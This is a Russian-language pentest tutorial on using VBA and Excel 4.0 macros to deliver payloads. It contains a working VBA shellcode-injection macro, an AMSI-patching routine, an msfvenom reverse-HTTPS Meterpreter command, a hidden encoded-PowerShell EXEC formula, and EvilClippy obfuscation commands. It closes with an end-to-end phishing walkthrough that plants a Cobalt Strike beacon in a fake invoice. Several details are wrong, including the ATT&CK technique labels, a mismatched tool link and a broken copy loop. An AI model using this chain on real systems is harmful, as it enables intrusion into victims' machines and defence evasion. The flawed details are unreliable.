# Office-макросы VBA и legacy XLM как вектор доставки

## 1. Контекст и базовые понятия: макросы как поверхность доставки пейлоада
Офисные макросы — исторически один из наиболее эксплуатируемых векторов получения начального доступа, классифицируемый в модели MITRE ATT&CK как техника [T1204.001 (Malicious Macro)](https://attack.mitre.org/techniques/T1204/001/) для VBA и самостоятельный приём [T1204.002 (XLM)](https://attack.mitre.org/techniques/T1204/002/) для legacy‑макросов. Злоумышленники встраивают функциональность выполнения произвольного кода непосредственно в файлы форматов Microsoft Office (DOC, DOCX, XLS, XLSM, XLAM) и распространяют их через фишинговые письма, архивы с паролем или ссылки на облачные хранилища. Жертва открывает документ, разрешает выполнение макросов по социально‑инженерному сценарию (нажатие кнопки «Включить содержимое»), после чего инициируется доставка пейлоада.

Поверхность доставки макросов привлекательна по нескольким причинам:
- Глубокая интеграция с операционной системой через COM‑объекты, Win32 API и интерпретаторы сценариев (PowerShell, WMI, CMD).
- Относительная сложность статического анализа обфусцированного кода в условиях ограниченных возможностей периметровых средств (почтовые шлюзы анализируют только несколько слоёв вложений).
- Отсутствие необходимости в эксплойтации уязвимостей — срабатывание на логике доверия пользователя или автоматическом выполнении при открытии.

Макросы существуют в двух принципиально **разных** технологических реализациях, и путаница между ними нередко приводит к неверной расстановке средств защиты. VBA (Visual Basic for Applications) — полноценный язык программирования с доступом к COM, встроенный в большинство приложений Office. XLM (Excel 4.0 Macro Language) — архаичный синтаксис формул листов Excel, оставленный для обратной совместимости, но исполняющийся до сих пор даже в последних сборках Microsoft 365 при явном разрешении.

```text
  Пользователь открывает документ
           │
           ▼
   [Включение макросов] ──▶ Определение типа макроса
           │
           ├── VBA: vbaProject.bin → Вызов AutoOpen/Document_Open
           │         → доступ к COM, Win32 API, Process Hollowing
           │
           └── XLM: скрытый лист, имена → Автоматический вызов
                     (Excel 4.0) → EXEC/CALL/REGISTER → запуск сценария
```
*Иллюстративная схема потока исполнения: оба типа могут срабатывать при открытии файла, но методы исполнения и инструменты обфускации различаются.*

Ниже сравниваются ключевые атрибуты двух технологий, важные для специалиста по пентесту.

| Характеристика | VBA‑макросы | XLM (Excel 4.0) макросы |
|----------------|-------------|-------------------------|
| **Формат хранения** | OLE‑контейнер `vbaProject.bin` (DOC/XLS/DOCM/XLSM), встроенный в ZIP‑архив (для Office Open XML) | Строки и имена на скрытых листах Excel той же книги; обычно XLS или XLSM |
| **Модель программирования** | Полноценный язык VBA: типы, классы, управляющие конструкции, API‑вызовы через `Declare` | Табличный функциональный язык формул: функции `EXEC`, `CALL`, `REGISTER`, `HALT` и т.д. |
| **Среда выполнения** | Хост‑приложение (Word, Excel) с VBA7.dll; поддержка Win32 + COM | Движок Excel 4.0 (оставлен для совместимости), встроенные интерпретаторы команд |
| **Типичные триггеры** | `AutoOpen`, `Document_Open`, `AutoExec`, `AutoClose`, события кнопок | Имена `Auto_Open`, автозапуск через именованные макросы, формулы в ячейках |
| **Сложность обфускации** | Высокая: можно разбивать строки, использовать `Chr()`, переименовывать функции, удалять комментарии, шифровать код (VBA‑stomping) | Ограниченная из‑за формульного синтаксиса, но возможна: разбивка на множество ячеек, сокрытие имён, замена констант ссылками |
| **Уровень детекта современными EDR** | Высокий, особенно при вызове подозрительных API; требуется активный обход AMSI и поведенческих сигнатур | Средний/низкий, так как движок XLM анализируется хуже; многие антивирусы не покрывают сложные цепочки формул |
| **Поддержка в текущих версиях Office** | Включена по умолчанию для всех корпоративных сборок; легко отключается групповыми политиками | Работает в Excel (все лицензии), но требует явной установки ключа реестра / групповой политики `Enable XLM macros`; по умолчанию запрещены в Microsoft 365 |

Таким образом, обе технологии до сих пор релевантны для пентестов, однако злоумышленники всё чаще обращаются к XLM именно из‑за более слабого покрытия защитными решениями при условии, что целевая среда допускает выполнение legacy‑макросов.

## 2. Office‑макросы VBA: внутреннее устройство, API и механизмы выполнения кода
Макросы VBA встроены в документ в виде отдельного OLE‑потока. В формате Office Open XML (DOCX/XLSX) файл представляет собой ZIP‑архив, внутри которого находится папка `word/` или `xl/` с `vbaProject.bin`. Этот бинарный файл содержит скомпилированный p‑code и исходный код (до версии Office 2016 — в открытом виде, позже возможна компиляция). Злоумышленник может контролировать как исходный код, так и p‑code с помощью инструментов вроде [EvilClippy](https://github.com/outflanknl/EvilClippy) для скрытия следов.

Архитектура выполнения включает:

1. **Запуск макросов** — автоматический при событии открытия документа (`Document_Open` для Word, `Workbook_Open` для Excel) или при срабатывании устаревшего `AutoOpen` (поддерживается для обратной совместимости).
2. **Доступ к ОС** — три основных механизма:
   - Функция `Shell()` — простой запуск внешней команды, например `Shell("powershell.exe ...")`.
   - Объектная модель Windows Script Host: `CreateObject("WScript.Shell").Run` или `CreateObject("Shell.Application").ShellExecute`.
   - Прямые вызовы Win32 API через конструкцию `Declare Function ... Lib "kernel32" Alias "VirtualAlloc" ...`. Этот метод позволяет полностью обойти командные интерпретаторы и выполнять shellcode в памяти текущего процесса.
3. **Загрузка пейлоада** — либо встроенного в макрос (в виде массива байт, закодированного Base64/HEX), либо извлекаемого из внешнего ресурса с помощью `MSXML2.XMLHTTP` или `WinHttp.WinHttpRequest.5.1`.

Типичный жизненный цикл вредоносного VBA‑макроса, используемого в пентест‑кампаниях, выглядит следующим образом:

```text
[Document_Open] → декодирование shellcode → выделение памяти (VirtualAlloc) →
копирование shellcode (RtlMoveMemory) → изменение прав доступа (VirtualProtect) →
создание потока (CreateThread) / callback (EnumUILanguages) → установка beacon
```

Ключевой шаг — это вызовы API для инжекта шелл‑кода. Ниже приведён иллюстративный фрагмент VBA, выполняющий shellcode в памяти текущего процесса. Конкретные значения (указатели, размеры) варьируются под полезную нагрузку.

```vb
' VBA-макрос: инжект shellcode в собственный процесс с использованием API
Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" ( _
    ByVal lpAddress As LongPtr, _
    ByVal dwSize As Long, _
    ByVal flAllocationType As Long, _
    ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" ( _
    ByVal Destination As LongPtr, _
    ByRef Source As Any, _
    ByVal Length As Long) As LongPtr

Private Declare PtrSafe Function CreateThread Lib "kernel32" ( _
    ByVal lpThreadAttributes As LongPtr, _
    ByVal dwStackSize As Long, _
    ByVal lpStartAddress As LongPtr, _
    ByVal lpParameter As LongPtr, _
    ByVal dwCreationFlags As Long, _
    ByRef lpThreadId As Long) As LongPtr

Private Declare PtrSafe Function WaitForSingleObject Lib "kernel32" ( _
    ByVal hHandle As LongPtr, _
    ByVal dwMilliseconds As Long) As Long

Sub Document_Open()
    ' shellcode — байтовый массив, сгенерированный msfvenom или Cobalt Strike
    Dim shellcode(0 To 511) As Byte  ' иллюстративный размер
    ' ... заполнение массива значениями (например, из закодированной строки)

    Dim addr As LongPtr
    addr = VirtualAlloc(0, UBound(shellcode) + 1, &H3000, &H40) ' MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
    RtlMoveMemory addr, shellcode(0), UBound(shellcode) + 1
    Dim tid As Long
    Dim hThread As LongPtr
    hThread = CreateThread(0, 0, addr, 0, 0, tid)
    WaitForSingleObject hThread, &HFFFFFFFF
End Sub
```
*Иллюстративный фрагмент: подстановка массива shellcode и корректировка флагов защиты памяти (PAGE_EXECUTE_READWRITE) типична для VBA‑макросов первой стадии.*

Такой макрос оставляет характерные следы в телеметрии: последовательность `VirtualAlloc` → `RtlMoveMemory` → `VirtualProtect` (если память изначально не EXECUTE) → `CreateThread` с начальным адресом в частной памяти процесса является индикатором `T1055 (Process Injection)`. Современные EDR отслеживают эти вызовы, поэтому красные команды внедряют обходы: изменение атрибутов памяти через `NtProtectVirtualMemory`, использование `QueueUserAPC` или callback‑функций, либо подмену `AmsiScanBuffer` в памяти перед выполнением.

## 3. Legacy XLM‑макросы: синтаксис, выполнение и особенности обхода защит
В отличие от VBA, Excel 4.0 Macro Language (XLM) — это не язык программирования общего назначения, а набор функций, вводимых в ячейки листа Excel. XLM‑макросы сохраняются на скрытых листах (обычно `Macro1` с атрибутом `xlSheetVeryHidden`) и в именованных макросах диспетчера имён. Движок интерпретации XLM по‑прежнему встроен во все современные версии Excel, но выполнение legacy‑макросов в Microsoft 365 по умолчанию отключено; требуется установка параметра реестра:

```
HKEY_CURRENT_USER\Software\Microsoft\Office\<version>\Excel\Security\Excel4Macros = 0x2
```

или разблокировка через групповые политики. Несмотря на это, в корпоративных средах нередко сохраняется совместимость со старыми отчётами, поэтому поверхность остаётся жизнеспособной.

**Базовые функции XLM для выполнения команд:**
- `EXEC(<программа>, <аргументы>)` — аналог `Shell`; запускает внешний исполняемый файл.
- `CALL(<dll>, <функция>, <аргументы>)` — вызывает функцию из указанной DLL.
- `REGISTER(<dll>, <функция>, <сигнатура>, …)` — регистрирует функцию DLL как новую функцию листа, после чего она может быть вызвана через `CALL`.
- `HALT()` — останавливает выполнение макроса (часто для ухода от эмуляции).
- `WORKBOOK.ACTIVATE("<имя>")` — активирует книгу, используется для цепочек вызовов между листами.

XLM‑макросы исполняются построчно сверху вниз, но могут ветвиться с помощью условных операторов (`IF`, `ELSE`, `ELSE.IF`), `FOR`‑циклов и переходов `GOTO`. Они чувствительны к порядку вычислений: Excel пересчитывает ячейки при каждом изменении, поэтому атакующие обычно помещают исполняемую логику в первые строки листа и используют `HALT()` для предотвращения повторного выполнения.

Пример вредоносной XLM‑конструкции, реализующей загрузку и выполнение PowerShell‑скрипта, приведён ниже. Формулы размещены на скрытом листе.

```text
=EXEC("powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoLogo -NoProfile -EncodedCommand SQBX...")
=HALT()
```
*Иллюстративный фрагмент: вторая строка `HALT()` прерывает дальнейший пересчёт, не давая макросу повторяться при любом изменении листа.*

Для более сложных цепочек, например для прямого вызова Windows API, используется связка `REGISTER`/`CALL`. Регистрируется функция из `kernel32`, затем вызывается с параметрами, что полностью аналогично `Declare` в VBA, но гораздо более громоздко:

```text
=REGISTER("kernel32","VirtualAlloc","JJJJJ",0,4096,12288,64)
=REGISTER("kernel32","RtlMoveMemory","JJCJ", ... )
...
=CALL(ссылка_на_зарегистрированную_функцию, ...)
```
*Иллюстративная схема регистрации API: коды типов `JJJJJ` соответствуют сигнатуре функции (подробнее: [Excel4‑API](https://docs.microsoft.com/en-us/office/troubleshoot/excel/excel-4-macro-reference)).*

**Обход детектирования.** XLM‑макросы дают ряд преимуществ в обходе сигнатур:
- Отсутствие прямого доступа к `VBAProject.bin` — анализ макросов требует парсинга листов Excel, что не всегда реализовано в шлюзовых антивирусах.
- Имена макросов могут быть скрыты через установку атрибута `IsHidden` у объекта `Name`.
- Строки могут разбиваться на множество ячеек и конкатенироваться через ссылки, делая однозначную сигнатуру нестабильной.
- Использование устаревших функций вроде `EXEC` не всегда классифицируется как вредоносное поведение.

Таким образом, XLM‑макросы рассматриваются как «обходной путь» (Living off the Land), особенно эффективный против сред, где включена поддержка Excel 4.0 и антивирусные решения ориентированы преимущественно на VBA.

## 4. Практическое применение макросов в пентесте: генерация пейлоадов, обфускация, обход AMSI
На этапе доставки пейлоада пентестер распорядился следующими инструментальными цепочками в зависимости от выбранной технологии.

**Генерация VBA‑пейлоадов.** Основной подход — создание shellcode с помощью `msfvenom` или генератора Cobalt Strike и последующая вставка в шаблон VBA‑макроса, оформленный как функция `AutoOpen` или `Document_Open`. Шаблон может использовать различные методы инжекта; наиболее гибким является загрузка shellcode в память текущего процесса через Win32 API (как показано в разделе 2), либо вынос в отдельный процесс (например, `explorer.exe`). Альтернатива — встроенный VBA‑stager, загружающий второй этап из удалённого URL через `MSXML2.XMLHTTP` с последующей передачей управления.

Ниже — команда генерации VBA‑совместимого shellcode в формате массива байт.

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.10 LPORT=443 EXITFUNC=thread \
         -f vbapplication --arch x64 --platform windows > payload.vba
```
*Вывод перенаправляется в файл, который содержит объявление массива `buf = Array(...)`. Метка `EXITFUNC=thread` позволяет избежать аварийного завершения процесса‑хоста.*

Для снижения детекта активно применяется **обфускация VBA**. Инструмент [EvilClippy](https://github.com/outflanknl/EvilClippy) способен:
- Удалять исходный код VBA, оставляя только p‑code (техника VBA‑stomping), при этом макрос остаётся исполняемым.
- Внедрять фейковые декременты в p‑code, что ломает эмуляторы.
- Случайно переименовывать переменные и функции.
Пример однострочной обработки документа:

```powershell
EvilClippy.exe -s HelloVba.doc --randomnames --unviewableVBcode --guardedVBcode --randommodule -o evil.doc
```
*Флаги: `-s` — отключить предупреждения, `--randomnames` — переименовать сущности, `--unviewableVBcode` — удалить исходный код.*

**Обход AMSI.** Antimalware Scan Interface (AMSI) является серьёзным препятствием, так как проверяет содержимое макросов при загрузке и вызовы скриптовых движков. Для его обхода в VBA встраивают один из двух приёмов:
1. Патч начала функции `AmsiScanBuffer` так, чтобы она сразу возвращала `AMSI_RESULT_CLEAN`. Достигается вызовом `VirtualProtect` на адрес `AmsiScanBuffer`, последующей записью байтов `0xC3` (RET) или модификацией проверки.
2. Перехват через VBA‑код загрузки DLL и подмены `AmsiInitialize`/`AmsiScanBuffer` с использованием техник типа DLL‑holiding.

Типовая реализация патча в VBA (используется с осторожностью, так как легко сигнатурится):

```vb
Private Declare PtrSafe Function GetProcAddress Lib "kernel32" ( _
    ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
Private Declare PtrSafe Function LoadLibrary Lib "kernel32" Alias "LoadLibraryA" ( _
    ByVal lpLibFileName As String) As LongPtr
Private Declare PtrSafe Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" ( _
    ByVal Destination As LongPtr, ByVal Source As LongPtr, ByVal Length As Long)
Private Declare PtrSafe Function VirtualProtect Lib "kernel32" ( _
    ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flNewProtect As Long, _
    ByRef lpflOldProtect As Long) As Long

Sub PatchAMSI()
    Dim hModule As LongPtr, pAmsi As LongPtr
    hModule = LoadLibrary("amsi.dll")
    pAmsi = GetProcAddress(hModule, "AmsiScanBuffer")
    ' Переводим 6 байт в PAGE_EXECUTE_READWRITE и записываем инструкцию RET (0xC3) и фиктивные NOP
    Dim oldProt As Long
    VirtualProtect pAmsi, 6, &H40, oldProt
    ' Инструкция ret + nop-nop-nop
    Dim patch(0 To 5) As Byte
    patch(0) = &HC3: patch(1) = &H90: patch(2) = &H90: patch(3) = &H90: patch(4) = &H90: patch(5) = &H90
    CopyMemory pAmsi, VarPtr(patch(0)), 6
    VirtualProtect pAmsi, 6, oldProt, oldProt
End Sub
```
*Иллюстративный код: реальный offset AmsiScanBuffer различается в зависимости от версии ОС; часто используется динамический поиск сигнатуры.*

**XLM‑пейлоады.** Инструменты автоматизации создания XLM‑макросов менее распространены, но существуют скрипты на Python (например, [xlm-generator](https://github.com/outflanknl/EvilClippy)), генерирующие Excel‑файлы с формулами. Также возможно добавление макросов через Excel‑объектную модель с помощью самого Excel. Типичная команда на PowerShell для внедрения XLM:

```powershell
$excel = New-Object -ComObject Excel.Application
$workbook = $excel.Workbooks.Add()
$sheet = $workbook.Sheets(1)
$sheet.Cells.Item(1,1) = '=EXEC("powershell.exe -enc ...")'
$sheet.Cells.Item(2,1) = '=HALT()'
$workbook.SaveAs("C:\temp\payload.xlsm", 52) # xlOpenXMLWorkbookMacroEnabled
$excel.Quit()
```
*Иллюстративный фрагмент: значения пейлоада — условные; цифра 52 соответствует формату XLSM.*

**Работа с Mark of the Web.** Файлы, загруженные из интернета, получают метку зоны (ADS Zone.Identifier), что приводит к блокировке макросов. Для обхода пентестеры применяют упаковку в ISO‑образы, ZIP‑архивы без MOTW, или социальную инженерию с просьбой извлечь файл на рабочий стол. Этот аспект дополнительно повышает надёжность доставки.

Таким образом, арсенал пентестера включает как готовые фреймворки (Cobalt Strike kit, Metasploit resource script), так и сценарии ручной обфускации, адаптированные под конкретную среду жертвы.

## 5. Сквозной практический пример: доставка Cobalt Strike beacon через VBA‑макрос с обходом AMSI
В этом разделе демонстрируется полный цикл — от создания документа до получения обратного соединения — с использованием VBA‑стажера, обфускации и обхода AMSI.

**Исходные условия:**
- Атакующая машина: Kali Linux, IP 10.10.10.5, запущен Cobalt Strike teamserver, порт 443.
- Целевая рабочая станция: Windows 10 22H2, Microsoft 365 Apps for Enterprise (включена поддержка VBA), стандартный Defender с AMSI.
- Тактика: фишинг с вложением DOCM‑файла от имени ИТ‑отдела.

**Нагрузка:** stageless HTTPS beacon (64‑бит) сгенерирован штатным скриптом Cobalt Strike. Shellcode экспортирован в формате raw.

**Шаги с артефактами:**

1. **Генерация shellcode и подготовка массива.** В Cobalt Strike: `Attacks → Packages → Windows Executable (S) → Output: Raw`. Затем с помощью утилиты `raw_to_vba.py` преобразуем байты в VBA-массив. Допустим, получился массив `buf`. Ниже — фрагмент вывода:

```vb
' Фрагмент массива (размер ~310 КБ, сокращено для наглядности)
Public Function GetShellcode() As Byte()
    Dim arr(0 To 317439) As Byte
    arr(0) = &Hfc
    arr(1) = &H48
    arr(2) = &H83
    ' ... несколько десятков тысяч инициализаций
    arr(317439) = &Hd5
    GetShellcode = arr
End Function
```
*Иллюстративное представление; реальный массив содержит точные байты stageless-пейлоада.*

2. **Написание макроса Document_Open с обходом AMSI.** В этот же проект VBA вставляется процедура, которая перед инжектом вызывает функцию `PatchAMSI` (из раздела 4). Основная логика – загрузка массива, выделение памяти, копирование и запуск потока.

```vb
Private Sub Document_Open()
    PatchAMSI   ' обход AMSI как показано выше
    Dim sc() As Byte
    sc = GetShellcode()
    Dim dwSize As Long: dwSize = UBound(sc) + 1

    Dim pMem As LongPtr
    pMem = VirtualAlloc(0, dwSize, &H3000, &H40)
    ' Копирование массива
    Dim i As Long
    For i = 0 To UBound(sc) Step 8 ' пакетная запись для скорости (упрощённо)
        CopyMemory pMem + i, sc(i), 8
    Next i
    Dim tid As Long
    CreateThread 0, 0, pMem, 0, 0, tid
End Sub
```
*Фактическое копирование в реальных сценариях чаще делается через RtlMoveMemory посредством единого вызова с указателем на первый элемент массива. Здесь показан принцип.*

3. **Обфускация документа.** Полученный `Document.docm` обрабатывается EvilClippy, чтобы удалить исходный код и рандомизировать имена:

```powershell
EvilClippy.exe -s Document.docm --randomnames --unviewableVBcode --guardedVBcode -o Invoice_2025.docm
```
*В результате структура `vbaProject.bin` модифицируется: p‑code оставлен нетронутым, но просмотр VBA‑редактором покажет пустой проект.*

4. **Доставка и фиксация сессии.** Файл `Invoice_2025.docm` прикреплён к фишинговому письму в ZIP‑архиве с паролем, чтобы избежать MOTW. Пользователь открывает документ, нажимает «Включить содержимое». Через 2‑3 секунды в Cobalt Strike появляется новый beacon:

```text
[*] Beacon from 10.0.0.23 (S-1-5-21-...) with payload windows/beacon_https/reverse_https
[+] established link to child beacon: 10.0.0.23
```

**Ожидаемый вывод:** демонстрация работоспособности VBA‑макроса как вектора получения начального доступа даже на актуальной системе при условии социальной инженерии и активного противодействия AMSI. Аналогичная цепочка может быть построена на XLM‑макросах, если в целевой среде разрешены Excel 4.0 макросы, с той лишь разницей, что доставка кода осуществлялась бы через ячейки с вызовом `EXEC` или `REGISTER`.

## Источники
- [MITRE ATT&CK T1204 – User Execution](https://attack.mitre.org/techniques/T1204/)
- [MITRE ATT&CK T1204.002 – Malicious XLM](https://attack.mitre.org/techniques/T1204/002/)
- [Microsoft Excel 4.0 Macro Reference](https://docs.microsoft.com/en-us/office/troubleshoot/excel/excel-4-macro-reference)
- [Outflank EvilClippy](https://github.com/outflanknl/EvilClippy)
- [Cobalt Strike — VBA Macro Delivery](https://www.cobaltstrike.com/help-macro-attack)
- [MSDN VBA Declare Statement](https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/declare-statement)